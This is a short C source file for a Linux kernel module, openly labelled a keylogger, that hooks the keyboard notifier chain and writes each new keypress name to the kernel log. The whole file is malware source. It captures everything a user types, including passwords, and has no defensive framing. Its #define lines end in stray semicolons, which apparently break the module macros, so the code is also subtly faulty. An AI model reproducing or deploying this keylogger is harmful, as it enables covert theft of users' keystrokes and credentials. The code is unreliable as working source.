#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#define LICENSE "GPL";
#define AUTHOR "1day";
#define DESCRIPTION "A simple kernel-level keylogger for Linux operating systems.";
#define VERSION "0.1";

static const char *keymap[128] = {
    [1] = "ESC",
    [2] = "1",
    [3] = "2",
    [4] = "3",
    [5] = "4",
    [6] = "5",
    [7] = "6",
    [8] = "7",
    [9] = "8",
    [10] = "9",
    [11] = "0",
    [12] = "MINUS",
    [13] = "EQUAL",
    [14] = "Backspace",
    [15] = "Tab",
    [16] = "Q",
    [17] = "W",
    [18] = "E",
    [19] = "R",
    [20] = "T",
    [21] = "Y",
    [22] = "U",
    [23] = "I",
    [24] = "O",
    [25] = "P",
    [26] = "LEFTBRACE",
    [27] = "RIGHTBRACE",
    [28] = "ENTER",
    [29] = "LEFTCTRL",
    [30] = "A",
    [31] = "S",
    [32] = "D",
    [33] = "F",
    [34] = "G",
    [35] = "H",
    [36] = "J",
    [37] = "K",
    [38] = "L",
    [39] = "SEMICOLON",
    [40] = "APOSTROPHE",
    [41] = "GRAVE",
    [42] = "LEFTSHIFT",
    [43] = "BACKSLASH",
    [44] = "Z",
    [45] = "X",
    [46] = "C",
    [47] = "V",
    [48] = "B",
    [49] = "N",
    [50] = "M",
    [51] = "COMMA",
    [52] = "DOT",
    [53] = "SLASH",
    [54] = "RIGHTSHIFT",
    [56] = "LEFTALT",
    [57] = "SPACE",
    [58] = "CAPSLOCK"  // Will be adding more keys in the future
};

static int last_pressed_key = -1;

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE) {
        if (param->value < sizeof(keymap) / sizeof(keymap[0]) && keymap[param->value]) {
            if (param->value != last_pressed_key) {
                printk(KERN_INFO "Key pressed: %s\n", keymap[param->value]);
                last_pressed_key = param->value;
            }
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify,
};

static int __init init_keylogger(void) {
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_ALERT "Keylogger loaded into the kernel\n");
    return 0;
}

static void __exit exit_keylogger(void) {
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_ALERT "Keylogger unloaded from the kernel\n");
}

module_init(init_keylogger);
module_exit(exit_keylogger);

MODULE_LICENSE(LICENSE);
MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESCRIPTION);
MODULE_VERSION(VERSION);
